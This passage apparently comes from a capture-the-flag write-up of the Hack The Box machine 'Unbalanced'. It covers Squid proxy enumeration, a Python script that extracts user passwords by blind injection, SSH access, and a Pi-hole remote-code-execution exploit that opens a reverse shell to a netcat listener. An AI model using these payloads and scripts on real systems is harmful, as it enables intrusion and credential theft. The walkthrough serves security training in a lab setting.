 vm_objects             In-Memory and In-Transit Objects        protected
 io                     Server-side network read() size histograms      disabled
 counters               Traffic and Resource Counters           protected
 peer_select            Peer Selection Algorithms               disabled
 digest_stats           Cache Digest and ICP blob               disabled
 5min                   5 Minute Average of Counters            protected
 60min                  60 Minute Average of Counters           protected
 utilization            Cache Utilization                       disabled
 histograms             Full Histogram Counts                   protected
 active_requests        Client-side Active Requests             disabled
 username_cache         Active Cached Usernames                 disabled
 openfd_objects         Objects with Swapout files open         disabled
 store_digest           Store Digest                            disabled
 store_log_tags         Histogram of store.log tags             disabled
 storedir               Store Directory Stats                   disabled
 store_io               Store IO Interface Stats                disabled
 store_check_cachable_stats     storeCheckCachable() Stats              disabled
 refresh                Refresh Algorithm Statistics            disabled
 delay                  Delay Pool Levels                       disabled
 forward                Request Forwarding Statistics           disabled
 cbdata                 Callback Data Registry Contents         protected
 sbuf                   String-Buffer statistics                protected
 events                 Event Queue                             protected
 netdb                  Network Measurement Database            disabled
 asndb                  AS Number Database                      disabled
 carp                   CARP information                        disabled
 userhash               peer userhash information               disabled
 sourcehash             peer sourcehash information             disabled
 server_list            Peer Cache Statistics                   disabled
```

`menu` returned the full list of info types I could query, but only a few were enabled, and every one of those was protected \(required authentication\)

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:pconn
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Sat, 14 Nov 2020 22:30:55 GMT
Content-Type: text/plain;charset=utf-8
Expires: Sat, 14 Nov 2020 22:30:55 GMT
Last-Modified: Sat, 14 Nov 2020 22:30:55 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

 Pool 0 Stats
server-peers persistent connection counts:

         Requests        Connection Count
         --------        ----------------

 Pool 0 Hash Table
         item 0:        172.17.0.1:80/intranet.unbalanced.htb
```

it appeared intranet.unbalanced.htb resolved internally to an address other than what I expected, pointing instead at `172.17.0.1`.

![](assets/wu/unbalanced/img-5.png)

Entering this address in my \(proxied\) browser loaded the very same page!

![](assets/wu/unbalanced/img-6.png)

`mem` and `diskd` yielded nothing of value, but `fqdncache` surfaced some interesting internal data

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:fqdncache
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Sat, 14 Nov 2020 22:35:38 GMT
Content-Type: text/plain;charset=utf-8
Expires: Sat, 14 Nov 2020 22:35:38 GMT
Last-Modified: Sat, 14 Nov 2020 22:35:38 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

FQDN Cache Statistics:
FQDNcache Entries In Use: 11
FQDNcache Entries Cached: 11
FQDNcache Requests: 38121
FQDNcache Hits: 0
FQDNcache Negative Hits: 21257
FQDNcache Misses: 16864
FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
10.10.14.85                                    N  -29276   0
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
10.10.14.255                                   N  -2925   0
10.10.15.88                                    N  022   0
```

This showed the IPs for intranet-host 2 and 3 I'd seen before. Nothing was listed for `172.31.179.1`, so I tried it directly to see why it might be missing

pic

![](assets/wu/unbalanced/img-7.png)

Pulled from the load balancer, yet not actually offline? I started wondering whether I could reach it to look into this "security maintenance" of theirs

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:filedescriptors
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Sat, 14 Nov 2020 22:42:54 GMT
Content-Type: text/plain;charset=utf-8
Expires: Sat, 14 Nov 2020 22:42:54 GMT
Last-Modified: Sat, 14 Nov 2020 22:42:54 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

Active file descriptors:
File Type   Tout Nread  * Nwrite * Remote Address        Description
---- ------ ---- -------- -------- --------------------- ------------------------------
   5 Socket    0       0        0  [::]:56761            DNS Socket IPv6
   8 Log       0       0        0                        /var/log/squid/cache.log
   9 Socket    0       0  1063233  0.0.0.0:57698         DNS Socket IPv4
  10 Socket    0       0        0  [::]:3128             HTTP Socket
  11 Socket 86400     151        0* 10.10.15.88:51866     Reading next request
  12 Socket    0       0        0  ::1:42500             pinger
```

the cache log at `/var/log/squid/cache.log` looked like it might be worth a look. The remaining methods didn't offer much

![](assets/wu/unbalanced/img-8.png)

Because the other hosts redirected index.php to `intranet.php`, I typed that path directly for host1 and the page loaded. Now I had to work out why it had been pulled for 'security maintenance'. The page was nearly identical to the others, so I guessed the flaw lived in the input fields

![](assets/wu/unbalanced/img-9.png)

I dropped a classic SQL injection probe `a ' or 'a' = 'a` into both the username and password fields, and the first attempt returned a list of users. Only the username field was actually vulnerable

I looked up how to drive hydra through a proxy - [https://forums.kali.org/showthread.php?18055-Hydra-using-Proxy](https://forums.kali.org/showthread.php?18055-Hydra-using-Proxy)

[https://stackoverflow.com/questions/517127/how-do-i-write-output-in-same-place-on-the-console](https://stackoverflow.com/questions/517127/how-do-i-write-output-in-same-place-on-the-console)

```python
import requests
import string

#URL to connect to
url = 'http://172.31.179.1/intranet.php'
#URL of connection proxy
proxy_url = 'http://<YOUR_IP>:3128'
#list of users to get passwords for
userlist = ['rita','jim','bryan','sarah']

def pass_brute(users):
    for user in users:
        print('\nGetting password for user: {0}'.format(user))

        data = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password,0,1)='x"}
        request = requests.post(url, data=data, proxies={'http':proxy_url})
        req_len = len(request.text)

        password = ''
        print('[+] Enumerating password: ', sep="", end="", flush=True)

        #Will test for passwords up to length 24. Edit this range for longer passwords
        for i in range(1,24):
            found = False
            for char in string.printable:

                #Print each character cycling through each guess and stopping when selected
                #can also be done with sys.stdout, for print() use end='\b' (backspace - for single characters only)
                print('{0}'.format(char), end="\b", flush=True)

                #Set up data to be sent in request. POST with username; SQL inject in password
                data = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password," + str(i) + ",1)='" + char + ""}
                request = requests.post(url, data=data, proxies={'http':proxy_url})
                #test to see if response shows valid guess
                if len(request.text) != req_len:
                    found = True
                    break
            if not found:
               break

            print('{0}'.format(char), sep="", end="", flush=True)
            password += char

        #print final password, stripping off the extra single quotes    
        print('\nUse credentials: {0}:{1}'.format(user,password).rstrip('\''))

pass_brute(userlist)
```

Oddly, supplying the username in the username field broke my injection, while passing it as a SQL parameter inside the password field worked fine...strange, but it did the job

```text
┌──(kac0㉿kali)-[~]
└─$ python3 pass_brute.py

Getting password for user: rita
[+] Enumerating password: password01!''''''''''''
Use credentials: rita:password01!

Getting password for user: jim
[+] Enumerating password: stairwaytoheaven'''''''
Use credentials: jim:stairwaytoheaven

Getting password for user: bryan
[+] Enumerating password: ireallyl0vebubblegum!!!
Use credentials: bryan:ireallyl0vebubblegum!!!

Getting password for user: sarah
[+] Enumerating password: sarah4evah'''''''''''''
Use credentials: sarah:sarah4evah
```

I ended up having to trim trailing `'` characters off the passwords. My guess is the server returned the same response for a '\`' as it did for a genuine match. I could have added a check skipping the single-quote test, but that risked missing the character if a password actually contained it, so I left it in and stripped them off afterward.

## Road to User

### Further enumeration

### Finding user creds

```text
┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
└─$ ssh bryan@<YOUR_IP>                                                                         2 ⨯
The authenticity of host '<YOUR_IP> (<YOUR_IP>)' can't be established.
ECDSA key fingerprint is SHA256:aiHhPmnhyt434Qvr9CpJRZOmU7m1R1LI29c11na1obY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '<YOUR_IP>' (ECDSA) to the list of known hosts.
bryan@<YOUR_IP>'s password: 
Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 17 14:16:06 2020 from <YOUR_IP>
bryan@unbalanced:~$ id && hostname
uid=1000(bryan) gid=1000(bryan) groups=1000(bryan)
unbalanced
```

With `bryan`'s password I logged straight in over SSH

### User.txt

```text
bryan@unbalanced:~$ ls -la
total 32
drwxr-xr-x 3 bryan bryan 4096 Jun 17 11:35 .
drwxr-xr-x 3 root  root  4096 Jun 17 11:35 ..
lrwxrwxrwx 1 root  root     9 Apr  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 bryan bryan  220 Apr  2  2020 .bash_logout
-rw-r--r-- 1 bryan bryan 3526 Apr  2  2020 .bashrc
drwx------ 3 bryan bryan 4096 Apr  2  2020 .gnupg
-rw-r--r-- 1 bryan bryan  807 Apr  2  2020 .profile
-rw-r--r-- 1 bryan bryan  798 Jun 17 11:35 TODO
-rw-r--r-- 1 root  root    33 Nov 13 09:52 user.txt
bryan@unbalanced:~$ cat user.txt 
3634************************bc51
```

Fortunately, this account also held the user flag!

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `bryan`

```text
bryan@unbalanced:~$ cat TODO
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]
```

```text
bryan@unbalanced:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for bryan: 
Sorry, user bryan may not run sudo on unbalanced.
```

Unfortunately `bryan` had no sudo rights at all

```text
bryan@unbalanced:/etc$ ss -lnpt
State        Recv-Q       Send-Q              Local Address:Port               Peer Address:Port       
LISTEN       0            32                        0.0.0.0:53                      0.0.0.0:*          
LISTEN       0            128                       0.0.0.0:22                      0.0.0.0:*          
LISTEN       0            5                         0.0.0.0:873                     0.0.0.0:*          
LISTEN       0            128                     127.0.0.1:8080                    0.0.0.0:*          
LISTEN       0            128                     127.0.0.1:5553                    0.0.0.0:*          
LISTEN       0            32                           [::]:53                         [::]:*          
LISTEN       0            128                          [::]:22                         [::]:*          
LISTEN       0            128                             *:3128                          *:*          
LISTEN       0            5                            [::]:873                        [::]:*
```

`ss -lntp` revealed a couple of ports listening internally that weren't exposed to the outside

```text
bryan@unbalanced:/etc$ curl http://127.0.0.1:8080
[ERROR]: Unable to parse results from <i>queryads.php</i>: <code>Unhandled error message (<code>Invalid domain!</code>)</code>
```

both ports errored out on connection. Port 5553 just hung, dragging my session down with it

```text
bryan@unbalanced:/etc$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       unbalanced.htb  unbalanced

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

172.17.0.1      intranet.unbalanced.htb
#172.31.179.1   intranet-host1.unbalanced.htb   # temporarily disabled
172.31.179.2    intranet-host2.unbalanced.htb
172.31.179.3    intranet-host3.unbalanced.htb
```

the hosts file held nothing beyond what I'd already pulled out through squid

```text
bryan@unbalanced:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:3f:b6 brd ff:ff:ff:ff:ff:ff
    inet <YOUR_IP>/24 brd <YOUR_IP> scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:3fb6/64 scope global dynamic mngtmpaddr 
       valid_lft 86248sec preferred_lft 14248sec
    inet6 fe80::250:56ff:feb9:3fb6/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:ba:f6:ce:ef brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-742fc4eb92b1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:8b:96:98:ba brd ff:ff:ff:ff:ff:ff
    inet 172.31.0.1/16 brd 172.31.255.255 scope global br-742fc4eb92b1
       valid_lft forever preferred_lft forever
    inet6 fe80::42:8bff:fe96:98ba/64 scope link 
       valid_lft forever preferred_lft forever
6: vethc21cbf2@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether ae:92:e6:50:02:65 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::ac92:e6ff:fe50:265/64 scope link 
       valid_lft forever preferred_lft forever
8: veth05c0f62@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether b2:c0:30:28:96:1d brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::b0c0:30ff:fe28:961d/64 scope link 
       valid_lft forever preferred_lft forever
10: vethf3f72c5@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether c6:1e:12:e0:94:35 brd ff:ff:ff:ff:ff:ff link-netnsid 3
    inet6 fe80::c41e:12ff:fee0:9435/64 scope link 
       valid_lft forever preferred_lft forever
12: veth69381a0@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether fa:14:dd:73:cc:f5 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::f814:ddff:fe73:ccf5/64 scope link 
       valid_lft forever preferred_lft forever
```

This gave me the IP of the docker container referenced in the TODO

```text
bryan@unbalanced:~$ ssh 172.17.0.1
The authenticity of host '172.17.0.1 (172.17.0.1)' can't be established.
ECDSA key fingerprint is SHA256:aiHhPmnhyt434Qvr9CpJRZOmU7m1R1LI29c11na1obY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.17.0.1' (ECDSA) to the list of known hosts.
bryan@172.17.0.1's password: 
Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Nov 14 18:46:33 2020 from 10.10.15.88
bryan@unbalanced:~$
```

I could log into the container using Bryan's credentials

```text
bryan@unbalanced:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
bryan:x:1000:1000:,,,:/home/bryan:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```

Only `bryan` and `root` have login shells

![](assets/wu/unbalanced/fix-16.png)

`dnsmasq.conf` carried a listen address of 172.31.0.1 - the same docker container address I'd come across earlier

```text
bryan@unbalanced:/etc$ ip route
default via <YOUR_IP> dev ens160 onlink 
<YOUR_IP>/24 dev ens160 proto kernel scope link src <YOUR_IP> 
169.254.0.0/16 dev ens160 scope link metric 1000 
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
172.31.0.0/16 dev br-742fc4eb92b1 proto kernel scope link src 172.31.0.1 

bryan@unbalanced:/etc$ ip neighbor
172.31.179.1 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:01 STALE
172.31.179.2 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:02 STALE
172.31.179.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:03 STALE
172.17.179.1 dev docker0  FAILED
172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALE
<YOUR_IP> dev ens160 lladdr 00:50:56:b9:f3:4f REACHABLE
fe80::250:56ff:feb9:f34f dev ens160 lladdr 00:50:56:b9:f3:4f router STALE
```

inspecting the locally cached routes and neighbors turned up a fresh IP I hadn't encountered yet, `172.31.11.3`

```text
bryan@unbalanced:/etc$ nc 172.31.11.3 5553
(UNKNOWN) [172.31.11.3] 5553 (?) : Connection refused
bryan@unbalanced:/etc$ nc 172.31.11.3 8080
(UNKNOWN) [172.31.11.3] 8080 (http-alt) : Connection refused
bryan@unbalanced:/etc$ nc 172.31.11.3 80
^C
bryan@unbalanced:/etc$ curl http://172.31.11.3

    <html><head>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
        <link rel='stylesheet' href='/pihole/blockingpage.css' type='text/css'/>
    </head><body id='splashpage'><img src='/admin/img/logo.svg'/><br/>Pi-<b>hole</b>: Your black hole for Internet advertisements<br><a href='/admin'>Did you mean to go to the admin panel?</a></body></html>
```

nc couldn't reach the new address, but a page was served on port 80 that curl managed to fetch. Curling the `/admin` page, however, returned nothing

![](assets/wu/unbalanced/img-11.png)

browsing to 172.31.11.3 showed a Pi-hole page; following the admin link led me to a new vhost at pihole.unbalanced.htb

```text
Pi-hole Version v4.3.2 Web Interface Version v4.3 FTL Version v4.3.1
```

Checking Pi-hole's releases, I saw the latest was 5.1. Searching for exploits against 4.3.2, I found a known remote command execution flaw [https://frichetten.com/blog/cve-2020-11108-pihole-rce/](https://frichetten.com/blog/cve-2020-11108-pihole-rce/) along with a metasploit module [https://www.exploit-db.com/exploits/48491](https://www.exploit-db.com/exploits/48491)

![](assets/wu/unbalanced/img-12.png)

A password was required to reach the settings page,

![](assets/wu/unbalanced/img-13.png)

The forgot-password link revealed useful detail about setting a `pihole` password, but the method needed `sudo` privileges.

[https://hub.docker.com/r/pihole/pihole](https://hub.docker.com/r/pihole/pihole) - I went hunting for it in the docker logs, but there was no `docker-compose.yml` file to be found.

```text
bryan@unbalanced:/etc$ docker logs pihole | grep WEBPASSWORD
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/containers/pihole/json: dial unix /var/run/docker.sock: connect: permission denied
```

I also lacked permission to read the docker logs

![](assets/wu/unbalanced/img-14.png)

I tried logging in as admin...and it worked! \(Should have started there!\). I also noticed the service was running as root

![](assets/wu/unbalanced/img-15.png)

blocklist

![](assets/wu/unbalanced/img-16.png)

blocklist update

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ nc -lvnp 8099                                                                                   1 ⨯
listening on [any] 8099 ...
connect to [10.10.15.88] from (UNKNOWN) [<YOUR_IP>] 55154
GET / HTTP/1.1
Host: 10.10.15.88:8099
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: */*
If-Modified-Since: Sun, 15 Nov 2020 02:29:23 GMT

HTTP/1.1 200 OK

test

^C
```

The opening stage of the exploit appeared to fire, but after refreshing I couldn't get it to print `.domain`. Maybe it wasn't vulnerable to this after all?

[https://github.com/frichetten/CVE-2020-11108-PoC](https://github.com/frichetten/CVE-2020-11108-PoC)

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ sudo python3 ./root-cve-2020-11108-rce.py prdbr29htat9e3p10o7c7le7h1 http://127.0.0.1 10.10.15.88 12345     
[+] Put Root Stager Success
[+] Received First Callback
[+] Received Second Callback
[+] Uploading Root Payload
[+] Put Shell Stager Success
[+] Received Third Callback
[+] Received Fourth Callback
[+] Uploading Shell Payload
[+] Triggering Exploit
```

running the PoC with all the correct arguments still got me nowhere. So I searched for a different exploit and came across [https://github.com/AndreyRainchik/CVE-2020-8816](https://github.com/AndreyRainchik/CVE-2020-8816)

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ python3 ./CVE-2020-8816.py http://127.0.0.1:1337 admin 10.10.15.88 12345                        2 ⨯
Attempting to verify if Pi-hole version is vulnerable
Logging in...
Login succeeded
Grabbing CSRF token
Attempting to read $PATH
Pihole is vulnerable and served's $PATH allows PHP
Sending payload
```

the payload was on its way...

```text
┌──(kac0㉿kali)-[~]
└─$ nc -lvnp 12345       
listening on [any] 12345 ...
id  
connect to [10.10.15.88] from (UNKNOWN) [<YOUR_IP>] 40152
/bin/sh: 0: can't access tty; job control turned off
$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

and a shell came back...as `www-data`!?

### Getting a shell

```text
┌──(kac0㉿kali)-[~]
└─$ nc -lvnp 12345       
listening on [any] 12345 ...
id  
connect to [10.10.15.88] from (UNKNOWN) [<YOUR_IP>] 40152
/bin/sh: 0: can't access tty; job control turned off
$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

and a shell came back...as `www-data`. It was a fairly restricted shell: no TTY, and several commands failed \(I couldn't even upgrade it with python!\). After poking around a bit, I concluded I was inside the pihole docker container.

```text
$ uname -a
Linux pihole.unbalanced.htb 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
```

`uname -a` confirmed it

```text
+ sed -i /local-service/d /etc/dnsmasq.d/01-pihole.conf
+ [[ '' == \a\l\l ]]
+ [[ '' == \l\o\c\a\l ]]
+ '[' -z eth0 ']'
+ add_dnsmasq_setting interface eth0
+ [[ eth0 != '' ]]
+ echo interface=eth0
+ [[ '' == true ]]
+ ProcessDHCPSettings
+ source /etc/pihole/setupVars.conf
++ WEBPASSWORD=66e1bd4dc966552f83ff1ac2f8f8c0d383c7b8f5f2eecf328c16600fe13e0f4b
++ PIHOLE_INTERFACE=eth0
++ IPV4_ADDRESS=0.0.0.0
++ IPV6_ADDRESS=0:0:0:0:0:0
++ PIHOLE_DNS_1=8.8.8.8
++ PIHOLE_DNS_2=8.8.4.4
++ QUERY_LOGGING=true
++ INSTALL_WEB_SERVER=true
++ INSTALL_WEB_INTERFACE=true
++ LIGHTTPD_ENABLED=true
+ [[ '' == \t\r\u\e ]]
+ [[ -f /etc/dnsmasq.d/02-pihole-dhcp.conf ]]
```

at the filesystem root `/` sat a file `pihole-install.log` holding a hash of the webpassword

```text
$ cd /root
$ ls -la
total 132
drwxrwxr-x 1 root root   4096 Apr  5  2020 .
drwxr-xr-x 1 root root   4096 Jul 30 05:13 ..
lrwxrwxrwx 1 root root      9 Apr  4  2020 .bash_history -> /dev/null
-rw-r--r-- 1 root root    570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root    148 Aug 17  2015 .profile
-rw-r--r-- 1 root root 113876 Sep 20  2019 ph_install.sh
-rw-r--r-- 1 root root    485 Apr  6  2020 pihole_config.sh
```

After exploring for a while, I realized I had access to the `/root` folder.

```text
    # Copy the temp log file into final log location for storage
    copy_to_install_log

    if [[ "${INSTALL_WEB_INTERFACE}" == true ]]; then
        # Add password to web UI if there is none
        pw=""
        # If no password is set,
        if [[ $(grep 'WEBPASSWORD' -c /etc/pihole/setupVars.conf) == 0 ]] ; then
            # generate a random password
            pw=$(tr -dc _A-Z-a-z-0-9 < /dev/urandom | head -c 8)
            # shellcheck disable=SC1091
            . /opt/pihole/webpage.sh
            echo "WEBPASSWORD=$(HashPassword ${pw})" >> ${setupVars}
        fi
    fi
```

The file `ph_install.sh` showed how the WEBPASSWORD gets generated

```bash
$ cat pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```

The `pihole_config.sh` script revealed yet another bubblegum-themed password. Given that the web portal ran as root, I figured the admin might have reused the same password for the `root` account.

```text
$ su root
su: must be run from a terminal
```

`su` wouldn't work from this restricted shell, so I switched to my SSH session as `bryan` and tried there

### Root.txt

```text
bryan@unbalanced:~$ su root
Password: 
root@unbalanced:/home/bryan# id && hostname
uid=0(root) gid=0(root) groups=0(root)
unbalanced
root@unbalanced:/home/bryan# cat /root/root.txt 
1f44************************82d7
```
